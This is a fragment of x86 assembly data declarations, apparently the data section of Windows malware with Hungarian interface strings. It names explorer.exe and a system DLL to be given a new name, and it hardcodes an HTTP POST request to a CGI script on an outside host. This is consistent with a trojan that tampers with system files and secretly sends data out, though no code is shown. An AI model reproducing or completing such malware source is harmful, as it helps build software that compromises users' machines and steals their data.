msg_exit        db "Kilepsz?",0
msg_title       db "Aktiv",0
_explorer       db "explorer.exe",0
_sysfname       db "\WINSHSM.DLL",0
_sysnewname     db "\WINSHSM.OCX",0
_host           db "deejayy.virtualave.net",0

_sin_fam        dw 0002h
_sin_port       dw 5000h
_sin_addr       dd 07F000001h
_sin_zero       db 0,0,0,0,0,0,0,0

_post           db "POST /cgi-bin/reload.pl HTTP/1.1",13,10,"Host: deejayy.virtualave.net",13,10,"Content-length:            "
_postend        db 13,10,13,10,0